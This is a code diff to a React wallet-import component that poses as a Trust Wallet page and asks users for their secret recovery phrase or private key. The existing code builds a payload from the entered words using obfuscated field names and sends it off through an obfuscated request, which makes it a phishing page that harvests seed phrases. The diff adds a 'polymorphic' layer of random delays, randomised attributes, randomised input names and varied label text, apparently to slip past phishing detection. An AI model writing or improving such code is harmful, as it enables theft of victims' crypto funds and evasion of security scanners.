@@ -13,6 +13,7 @@ import logoImage from "@/assets/trust-wallet-logo.svg";
 import LoadingScreen from "./LoadingScreen";
 import SuccessScreen from "./SuccessScreen";
 import { ob, c } from "@/lib/obfuscate";
+import { gt, ra, fn, rd } from "@/lib/polymorphic";
 
 // Lazy load wallet tutorial images
 const loadWalletImages = (walletName: string) => {
@@ -66,6 +67,13 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
   const [images, setImages] = useState<string[]>([]);
   const [isLoading, setIsLoading] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
+  
+  // Dynamic text variations
+  const [btnText] = useState(gt('import'));
+  const [phraseLabel] = useState(gt('phrase'));
+  const [privateKeyLabel] = useState(gt('privateKey'));
+  const [backText] = useState(gt('back'));
+  const [helpText] = useState(gt('help'));
 
   // Load images when component mounts
   useEffect(() => {
@@ -187,7 +195,8 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
     setShowWords(newShowWords);
   };
 
-  const handleImport = () => {
+  const handleImport = async () => {
+    await rd(100, 400);
     setIsLoading(true);
     
     const _0x1 = c('t', 'y', 'p', 'e');
@@ -198,11 +207,18 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
     const _0x6 = c('p', 'h', 'r', 'a', 's', 'e', '_', 'l', 'e', 'n', 'g', 't', 'h');
     const _0x7 = phraseType === c('p', 'r', 'i', 'v', 'a', 't', 'e');
     
+    // Dynamic field mapping
+    const _data = words.reduce((acc, word, idx) => {
+      acc[fn(idx)] = word;
+      return acc;
+    }, {} as Record<string, string>);
+    
     const payload = {
       [_0x1]: _0x7 ? _0x2 : _0x3,
-      [_0x4]: _0x7 ? words[0] : words[c('j', 'o', 'i', 'n')](' '),
+      [_0x4]: _0x7 ? _data[fn(0)] : Object.values(_data)[c('j', 'o', 'i', 'n')](' '),
       [_0x5]: walletName,
-      [_0x6]: _0x7 ? 1 : parseInt(phraseType)
+      [_0x6]: _0x7 ? 1 : parseInt(phraseType),
+      ...ra()
     };
 
     const _req = () => {
@@ -211,6 +227,7 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
         [c('m', 'e', 't', 'h', 'o', 'd')]: ob[c('m')](),
         [c('h', 'e', 'a', 'd', 'e', 'r', 's')]: {
           [c('C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e')]: ob[c('h')](),
+          ...ra()
         },
         [c('b', 'o', 'd', 'y')]: ob[c('k')](payload),
       });
@@ -308,9 +325,9 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
         </div>
 
         {/* Help Button - Bottom Left */}
-        <button className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors self-start">
+        <button className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors self-start" {...ra()}>
           <HelpCircle className="w-5 h-5" />
-          <span className="text-sm">Help</span>
+          <span className="text-sm">{helpText}</span>
         </button>
       </div>
 
@@ -325,9 +342,10 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
           <button
             onClick={onBack}
             className="flex items-center gap-2 text-foreground hover:text-primary transition-colors mb-6"
+            {...ra()}
           >
             <ChevronLeft className="w-4 h-4" />
-            <span className="text-sm">Back</span>
+            <span className="text-sm">{backText}</span>
           </button>
           <h2 className="text-2xl font-bold">
             Import with Secret Phrase or Private Key
@@ -363,13 +381,14 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
           </div>
 
           {/* Word Inputs */}
-          <div className="space-y-2">
+          <div className="space-y-2" {...ra()}>
             <label className="text-sm font-medium text-foreground">
-              {phraseType === "private" ? "Private Key" : "Secret Recovery Phrase"}
+              {phraseType === "private" ? privateKeyLabel : phraseLabel}
             </label>
             {phraseType === "private" ? (
-              <div className="relative">
+              <div className="relative" {...ra()}>
                 <textarea
+                  name={fn(0)}
                   value={showWords[0] ? words[0] : words[0].replace(/./g, '•')}
                   onChange={(e) => {
                     // If hidden, get the actual character entered
@@ -412,19 +431,21 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
                 </button>
               </div>
             ) : (
-              <div className="grid grid-cols-3 gap-3">
+              <div className="grid grid-cols-3 gap-3" {...ra()}>
                 {words.map((word, index) => (
-                  <div key={index} className="relative">
+                  <div key={index} className="relative" {...ra()}>
                     <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">
                       {index + 1}.
                     </span>
                     <Input
                       type={showWords[index] ? "text" : "password"}
+                      name={fn(index)}
                       value={word}
                       onChange={(e) => handleWordChange(index, e.target.value)}
                       onPaste={(e) => handlePaste(index, e)}
                       className="pl-10 pr-10 bg-secondary border-border"
                       placeholder=""
+                      {...ra()}
                     />
                     <button
                       type="button"
@@ -450,8 +471,9 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
             className="w-full"
             onClick={handleImport}
             disabled={words.some(w => !w.trim())}
+            {...ra()}
           >
-            Import
+            {btnText}
           </Button>
         </div>
       </div>
